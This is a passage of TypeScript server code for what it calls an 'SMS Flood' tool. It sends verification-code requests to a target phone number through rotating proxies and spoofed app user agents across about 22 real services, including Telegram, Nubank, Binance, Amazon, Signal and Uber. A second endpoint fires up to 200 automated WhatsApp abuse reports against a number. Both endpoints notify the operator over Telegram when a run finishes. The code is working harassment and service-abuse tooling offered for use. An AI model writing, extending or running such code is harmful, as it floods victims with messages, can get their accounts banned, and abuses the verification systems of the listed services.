        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: OLXBrasil/6.0 Android",
        "-H", "Accept: application/json",
        "--data-raw", JSON.stringify({ phone: num.e164 }),
        "https://auth.olx.com.br/user/phone/send-otp",
      ], 12_000),
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: OLXBrasil/6.0 Android",
        "--data-raw", JSON.stringify({ phoneNumber: num.subscriber, areaCode: num.ddd }),
        "https://api.olx.com.br/accounts/sms-otp",
      ], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes("incapsula")),

    // ── 16. Binance ───────────────────────────────────────────────────────
    tryEndpoints("Binance", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/json",
        "-H", "User-Agent: Binance/2.56.0 Android",
        "-H", "Accept: application/json",
        "--data-raw", JSON.stringify({ mobile: num.subscriber, mobileCode: `+${num.cc}`, sceneType: "1" }),
        "https://www.binance.com/bapi/accounts/v2/public/authcenter/send/otp",
      ], 12_000),
    ], r => r.statusCode === 200 && r.body.includes('"success":true')),

    // ── 17. Amazon Brasil ─────────────────────────────────────────────────
    tryEndpoints("Amazon", [
      () => runCurl([
        ...pickProxyArgs(),
        "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "User-Agent: Amazon/24.1.2.800 Android/14",
        "-H", "Accept: application/json",
        "--data-raw", `phoneNumber=${encodeURIComponent(num.e164)}&action=resend&requestId=${Math.random().toString(36).slice(2)}`,
        "https://www.amazon.com.br/ap/ajax/mfa/request_otp",
      ], 12_000),
    ], r => r.statusCode === 200 && !r.body.toLowerCase().includes("error")),

  ]);

  const sent  = results.filter(r => r.status === "sent").length;
  const failed = results.filter(r => r.status === "failed").length;

  pushHistory({
    type:     "sendcode",
    number:   num.e164,
    sent,
    total:    results.length,
    at:       Date.now(),
    userId,
    services: results.map(r => ({ service: r.service, status: r.status })),
  });

  res.json({ number: num.e164, sent, failed, total: results.length, services: results });
});

// ── Telegram notification helper ──────────────────────────────────────────────
async function notifyTelegramChat(chatId: string, html: string): Promise<void> {
  const token = process.env.TELEGRAM_BOT_TOKEN ?? "";
  if (!token || !chatId) return;
  try {
    await runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "--data-raw", JSON.stringify({ chat_id: chatId, text: html, parse_mode: "HTML" }),
      `https://api.telegram.org/bot${token}/sendMessage`,
    ], 8_000);
  } catch { /**/ }
}

// ── GET /stream/report — SSE real-time progress ───────────────────────────────
router.get("/stream/report", async (req, res): Promise<void> => {
  const { number, quantity, userId, chatId } = req.query as Record<string, string>;
  if (!number) { res.status(400).end(); return; }
  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).end(); return; }
  if (isRateLimited(userId, 50)) {
    res.writeHead(429, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ error: "rate_limit" })); return;
  }

  res.writeHead(200, {
    "Content-Type":     "text/event-stream",
    "Cache-Control":    "no-cache, no-store",
    "Connection":       "keep-alive",
    "X-Accel-Buffering":"no",
    "Access-Control-Allow-Origin": "*",
  });

  const emit = (data: object) => { if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`); };
  const qty         = Math.min(Math.max(1, parseInt(String(quantity ?? 1), 10)), 200);
  const CONCURRENCY = Math.min(qty, 10);
  const indices     = Array.from({ length: qty }, (_, i) => i);
  let sent = 0, failed = 0;

  emit({ type: "start", number: num.e164, total: qty });

  for (let batch = 0; batch < indices.length; batch += CONCURRENCY) {
    const slice      = indices.slice(batch, batch + CONCURRENCY);
    const batchStart = batch;
    const batchRes   = await Promise.allSettled(slice.map(idx => sendOneReport(num.e164, idx, 3)));
    for (let i = 0; i < batchRes.length; i++) {
      const r = batchRes[i]!;
      const ok  = r.status === "fulfilled" && r.value.ok;
      const det = r.status === "fulfilled" ? (r.value.detail ?? "") : "error";
      ok ? sent++ : failed++;
      emit({ type: "progress", n: batchStart + i + 1, total: qty, ok, detail: det });
    }
    if (batch + CONCURRENCY < indices.length) await randDelay(800, 2200);
  }

  pushHistory({ type: "report", number: num.e164, sent, total: qty, at: Date.now(), userId });
  emit({ type: "done", sent, failed, total: qty });
  res.end();

  if (chatId) {
    await notifyTelegramChat(chatId,
      `${sent > 0 ? "✅" : "❌"} <b>Report WA concluído</b>\n` +
      `📱 <code>${num.e164}</code>\n` +
      `✅ Enviados: <b>${sent}/${qty}</b>  ❌ Falhos: <b>${failed}</b>`
    );
  }
});

// ── GET /stream/sendcode — SSE real-time progress ─────────────────────────────
router.get("/stream/sendcode", async (req, res): Promise<void> => {
  const { number, userId, chatId } = req.query as Record<string, string>;
  if (!number) { res.status(400).end(); return; }
  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).end(); return; }
  if (isRateLimited(userId, 20)) {
    res.writeHead(429, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ error: "rate_limit" })); return;
  }

  res.writeHead(200, {
    "Content-Type":     "text/event-stream",
    "Cache-Control":    "no-cache, no-store",
    "Connection":       "keep-alive",
    "X-Accel-Buffering":"no",
    "Access-Control-Allow-Origin": "*",
  });

  const emit = (data: object) => { if (!res.writableEnded) res.write(`data: ${JSON.stringify(data)}\n\n`); };
  const sseResults: Array<{ service: string; status: "sent"|"failed" }> = [];

  async function sseService(
    service: string,
    endpoints: Array<() => Promise<CurlResult>>,
    isOk: (r: CurlResult) => boolean
  ): Promise<void> {
    for (const fn of endpoints) {
      try { const r = await fn(); if (isOk(r)) { sseResults.push({ service, status: "sent" }); emit({ type: "service", service, ok: true }); return; } }
      catch { /**/ }
    }
    sseResults.push({ service, status: "failed" }); emit({ type: "service", service, ok: false });
  }

  // Count services ahead of time for the start event
  const SERVICE_COUNT = 22;
  emit({ type: "start", number: num.e164, services: SERVICE_COUNT });

  await Promise.allSettled([

    // ── 1. Telegram ───────────────────────────────────────────────────────────
    (async () => {
      const TG_ARGS = [
        "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded",
        "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "-H", "X-Requested-With: XMLHttpRequest", "-H", "Origin: https://my.telegram.org",
        "-H", "Referer: https://my.telegram.org/auth",
        "--data", `phone=${encodeURIComponent(num.e164)}`,
        "https://my.telegram.org/auth/send_password",
      ];
      const proxies = getAllProxyArgs(); let randomHash = "";
      for (const proxy of proxies) {
        try { const r = await runCurl([...proxy, ...TG_ARGS], 12_000); if (r.body.includes("random_hash")) { const m = r.body.match(/"random_hash"\s*:\s*"([^"]+)"/); randomHash = m?.[1] ?? ""; if (randomHash) break; } } catch { /**/ }
      }
      if (!randomHash) { try { const r = await runCurl(TG_ARGS, 12_000); if (r.body.includes("random_hash")) { const m = r.body.match(/"random_hash"\s*:\s*"([^"]+)"/); randomHash = m?.[1] ?? ""; } } catch { /**/ } }
      const ok = !!randomHash; sseResults.push({ service: "Telegram", status: ok ? "sent" : "failed" }); emit({ type: "service", service: "Telegram", ok });
    })(),

    // ── 2. iFood ─────────────────────────────────────────────────────────────
    sseService("iFood", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: iFood/25.1.4 Android", "-H", "platform: android", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://marketplace.ifood.com.br/v2/identity/sendCode"], 12_000),
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: iFood/25.1.4 Android", "--data-raw", JSON.stringify({ phone: num.e164, onboardingId: "" }), "https://marketplace.ifood.com.br/v3/identity/request-code"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300),

    // ── 3. Rappi ─────────────────────────────────────────────────────────────
    sseService("Rappi", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Rappi/14.5 Android", "-H", "x-country-code: BR", "--data-raw", JSON.stringify({ cellphone: num.subscriber, country_code: num.cc, type: "sms" }), "https://services.rappi.com.br/api/ms/auth/v2/phone-verification/send-code"], 12_000),
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Rappi/14.5 Android", "--data-raw", JSON.stringify({ phone: num.subscriber, country_code: num.cc }), "https://services.rappi.com.br/api/ms/users-ms/v5/phone/send-otp"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300),

    // ── 4. PicPay ────────────────────────────────────────────────────────────
    sseService("PicPay", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: PicPay/23.0 Android", "-H", "x-picpay-client: android", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://api.picpay.com/v2/accounts/phone"], 12_000),
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: PicPay/23.0 Android", "--data-raw", JSON.stringify({ cellphone: num.subscriber, countryCode: num.cc }), "https://api.picpay.com/v1/user/phone"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300),

    // ── 5. MercadoLivre ──────────────────────────────────────────────────────
    sseService("MercadoLivre", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: MELI-Android/9.70.0", "-H", "x-platform: mobile", "--data-raw", JSON.stringify({ phone: num.e164, site_id: "MLB" }), "https://api.mercadolibre.com/users/registrations/phone-verification/send-code"], 12_000),
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: MELI-Android/9.70.0", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://api.mercadolibre.com/users/checkpoints/phone/send_code"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300),

    // ── 6. Shopee ────────────────────────────────────────────────────────────
    sseService("Shopee", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Shopee/3.26 Android", "-H", "X-Shopee-Language: pt-BR", "-H", "referer: https://shopee.com.br/user/signup", "--data-raw", JSON.stringify({ phone: `+${num.cc}${num.subscriber}`, support_type: [1], version: 2 }), "https://shopee.com.br/api/v4/user/register/phone_verify"], 12_000),
    ], r => r.statusCode === 200 && (r.body.includes('"error":0') || r.body.includes('"code":0'))),

    // ── 7. TikTok ────────────────────────────────────────────────────────────
    sseService("TikTok", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "User-Agent: com.zhiliaoapp.musically/2023130060 (Linux; U; Android 13; pt_BR; Pixel 7; Build/TQ3A.230901.001; Cronet/112.0.5615.136)", "-H", "Content-Type: application/x-www-form-urlencoded", "-H", "Accept-Language: pt-BR", "--data-raw", `account=${encodeURIComponent(num.e164)}&type=0&aid=1233&mix_mode=1&iid=7305723840735675170&device_id=7294823471836275202`, "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/auth/sms_send/?os_api=29&device_type=Pixel7&build_number=36.1.3"], 12_000),
    ], r => r.statusCode === 200 && (r.body.includes('"status_code":0') || r.body.includes('"success_sms"'))),

    // ── 8. Nubank ────────────────────────────────────────────────────────────
    (async () => {
      try {
        const disc = await runCurl([...pickProxyArgs(), "-H", "User-Agent: nubank-android-12.0", "-H", "Accept: application/json", "https://prod-global-auth.nubank.com.br/api/discovery"], 10_000);
        const bodyTrimmed = (disc.body ?? "").trim();
        let smsUrl = "";
        if (bodyTrimmed.startsWith("{")) {
          try { const d = JSON.parse(bodyTrimmed) as Record<string,string>; smsUrl = d["send_sms_challenge"] ?? d["request_code"] ?? ""; } catch { /**/ }
        }
        if (smsUrl) {
          const r = await runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: nubank-android-12.0", "--data-raw", JSON.stringify({ phone_number: num.e164 }), smsUrl], 12_000);
          const ok = r.statusCode === 200 || r.statusCode === 201; sseResults.push({ service: "Nubank", status: ok ? "sent" : "failed" }); emit({ type: "service", service: "Nubank", ok });
        } else {
          const r = await runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: nubank-android-12.0", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://prod-s0-corona.nubank.com.br/api/login"], 10_000);
          const ok = r.statusCode === 200 || r.statusCode === 201; sseResults.push({ service: "Nubank", status: ok ? "sent" : "failed" }); emit({ type: "service", service: "Nubank", ok });
        }
      } catch { sseResults.push({ service: "Nubank", status: "failed" }); emit({ type: "service", service: "Nubank", ok: false }); }
    })(),

    // ── 9. Zé Delivery ───────────────────────────────────────────────────────
    sseService("ZeDelivery", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: ZeDelivery/10.0 Android", "--data-raw", JSON.stringify({ phoneNumber: num.e164 }), "https://api.ze.delivery/public-api/v3/identification/send-sms"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes("incapsula")),

    // ── 10. 99Food ───────────────────────────────────────────────────────────
    sseService("99Food", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: 99food/3.0 Android", "-H", "X-App-Platform: android", "--data-raw", JSON.stringify({ phone: num.e164, country_code: `+${num.cc}` }), "https://api-br.99app.com/v1/passenger/phone/register"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300),

    // ── 11. Kwai ─────────────────────────────────────────────────────────────
    sseService("Kwai", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Kwai/10.2.40.573147 Android", "--data-raw", JSON.stringify({ phoneNumber: num.e164, countryCode: `+${num.cc}`, action: "REGISTER", language: "pt" }), "https://rest.kwai.com/rest/n/mab/user/sendVerifyCode"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && r.body.length > 2 && !r.body.toLowerCase().includes('"error"')),

    // ── 12. InDrive ──────────────────────────────────────────────────────────
    sseService("InDrive", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: inDrive/7.0 Android", "--data-raw", JSON.stringify({ phone: num.e164, country_code: num.cc, client_id: "indrive.passenger.android" }), "https://api.indrive.com/auth/v1/otp/send"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300),

    // ── 13. Signal ───────────────────────────────────────────────────────────
    sseService("Signal", [
      () => runCurl([...pickProxyArgs(), "-H", "User-Agent: Signal-Android/6.31.3 Android/29", "-H", "X-Signal-Agent: Signal-Android/6.31.3 Android/29", "-H", "Accept: application/json", `https://api2.signal.org/v1/accounts/sms/code/${encodeURIComponent(num.e164)}?client=android&challenge_type=recaptcha`], 12_000),
    ], r => r.statusCode === 200 || r.statusCode === 204),

    // ── 14. Uber ─────────────────────────────────────────────────────────────
    sseService("Uber", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Uber/4.492.10001 Android/14", "-H", "x-uber-device-id: " + Math.random().toString(36).slice(2), "--data-raw", JSON.stringify({ phoneNumber: num.e164, countryISOCode: "BR", useCase: "REGISTRATION" }), "https://auth.uber.com/v2/phone/code"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.includes('"code":"too_many_requests"')),

    // ── 15. OLX Brasil ───────────────────────────────────────────────────────
    sseService("OLX", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: OLXBrasil/6.0 Android", "-H", "Accept: application/json", "--data-raw", JSON.stringify({ phone: num.e164 }), "https://auth.olx.com.br/user/phone/send-otp"], 12_000),
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: OLXBrasil/6.0 Android", "--data-raw", JSON.stringify({ phoneNumber: num.subscriber, areaCode: num.ddd }), "https://api.olx.com.br/accounts/sms-otp"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes("incapsula")),

    // ── 16. Binance ──────────────────────────────────────────────────────────
    sseService("Binance", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Binance/2.56.0 Android", "-H", "Accept: application/json", "--data-raw", JSON.stringify({ mobile: num.subscriber, mobileCode: `+${num.cc}`, sceneType: "1" }), "https://www.binance.com/bapi/accounts/v2/public/authcenter/send/otp"], 12_000),
    ], r => r.statusCode === 200 && r.body.includes('"success":true')),

    // ── 17. Amazon Brasil ────────────────────────────────────────────────────
    sseService("Amazon", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-H", "User-Agent: Amazon/24.1.2.800 Android/14", "-H", "Accept: application/json", "--data-raw", `phoneNumber=${encodeURIComponent(num.e164)}&action=resend&requestId=${Math.random().toString(36).slice(2)}`, "https://www.amazon.com.br/ap/ajax/mfa/request_otp"], 12_000),
    ], r => r.statusCode === 200 && !r.body.toLowerCase().includes("error")),

    // ── 18. Nubank Pix (chave Pix — requer IP brasileiro) ────────────────────
    sseService("Nubank Pix", [
      async () => {
        const disc = await runCurl([...pickProxyArgs(), "-H", "User-Agent: nubank-android-24.0", "-H", "Accept: application/json", "https://prod-global-auth.nubank.com.br/api/discovery"], 10_000);
        const links = JSON.parse(disc.body) as Record<string, string>;
        const smsUrl = links["gen_certificate"] ?? links["revoke_token"] ?? "";
        if (!smsUrl) return disc;
        return runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: nubank-android-24.0", "--data-raw", JSON.stringify({ login: num.e164 }), smsUrl], 12_000);
      },
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: nubank-android-24.0", "--data-raw", JSON.stringify({ phone_number: num.e164 }), "https://prod-s0-corona.nubank.com.br/api/login"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.includes('"error"')),

    // ── 19. PicPay Pix (chave Pix — requer IP brasileiro) ────────────────────
    sseService("PicPay Pix", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: PicPay/22.1.0 Android", "-H", "Accept: application/json", "--data-raw", JSON.stringify({ phone: num.e164, channel: "sms" }), "https://api.picpay.com/v2/auth/phone-verification"], 12_000),
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: PicPay/22.1.0 Android", "--data-raw", JSON.stringify({ login: num.e164, type: "phone" }), "https://api.picpay.com/auth/v2/login"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes('"error"')),

    // ── 20. RecargaPay (carteira digital — requer IP brasileiro) ─────────────
    sseService("RecargaPay", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: RecargaPay/8.0 Android", "-H", "Accept: application/json", "--data-raw", JSON.stringify({ msisdn: num.e164, channel: "sms" }), "https://api.recargapay.com.br/v4/users/otp/request"], 12_000),
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: RecargaPay/8.0 Android", "--data-raw", JSON.stringify({ phone: num.subscriber, country_code: num.cc }), "https://api.recargapay.com.br/v3/user/login"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes('"code":"error"')),

    // ── 21. Mercado Pago Pix (chave Pix) ─────────────────────────────────────
    sseService("Mercado Pago", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: MercadoPago/2.239.0 Android", "-H", "X-Platform: mobile", "--data-raw", JSON.stringify({ phone: { area_code: num.ddd || "11", number: num.subscriber }, channel: "sms" }), "https://api.mercadopago.com/v1/beta/users/phone/otp?platform=mp"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes('"error"')),

    // ── 22. Kwai Brasil 2 (alternativo) ──────────────────────────────────────
    sseService("Kwai BR", [
      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Kwai/10.2.40.573147 Android", "--data-raw", JSON.stringify({ phoneNumber: num.e164, countryCode: `+${num.cc}`, action: "FORGOT_PWD", language: "pt" }), "https://rest.kwai.com/rest/n/mab/user/sendVerifyCode"], 12_000),
    ], r => r.statusCode >= 200 && r.statusCode < 300 && r.body.length > 2 && !r.body.toLowerCase().includes('"error"')),

  ]);

  const sentSse  = sseResults.filter(r => r.status === "sent").length;
  const failedSse = sseResults.filter(r => r.status === "failed").length;

  pushHistory({ type: "sendcode", number: num.e164, sent: sentSse, total: sseResults.length, at: Date.now(), userId, services: sseResults });
  emit({ type: "done", sent: sentSse, failed: failedSse, total: sseResults.length });
  res.end();

  if (chatId) {
    const lines = sseResults.map(r => `${r.status === "sent" ? "✅" : "❌"} ${r.service}`).join("\n");
    await notifyTelegramChat(chatId,
      `${sentSse > 0 ? "📲" : "❌"} <b>SMS Flood concluído</b>\n` +
      `📱 <code>${num.e164}</code>\n` +
      `✅ Serviços OK: <b>${sentSse}/${sseResults.length}</b>\n\n${lines.slice(0, 800)}`
    );
  }
});

export default router;
